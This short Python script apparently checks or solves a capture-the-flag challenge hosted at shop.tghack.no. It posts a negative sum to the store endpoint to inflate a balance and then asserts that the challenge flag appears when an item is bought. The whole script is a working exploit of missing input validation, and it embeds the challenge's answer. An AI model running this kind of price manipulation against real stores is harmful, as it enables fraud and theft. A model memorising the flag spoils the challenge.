#!/usr/bin/env python3
import sys
import re
import requests

def post_data(endpoint, dsum, did):
    with requests.post(endpoint, data = {"sum": dsum, "id": did}) as r:
        return r.text

def get_redirect(endpoint):
    with requests.get(endpoint) as r:
        return r.url


def run_test():
    base_endpoint = ""

    if len(sys.argv) == 1:
        base_endpoint = "https://shop.tghack.no"
    elif len(sys.argv) == 2:
        base_endpoint = sys.argv[1]

    if len(base_endpoint) == 0:
        print(sys.argv[0] + " <endpoint>")
    else:
        bank_endpoint = get_redirect(base_endpoint)
        store_endpoint = re.sub(r"/bank/?$", "/store", bank_endpoint)
        post_data(store_endpoint, "-1500", "50")
        assert "TG20{I_just_want_to_buy_a_real_flag}" in post_data(store_endpoint, "1337", "13")

try:
    run_test()
except (OSError, AssertionError, NameError):
    sys.exit(102)
else:
    sys.exit(101)
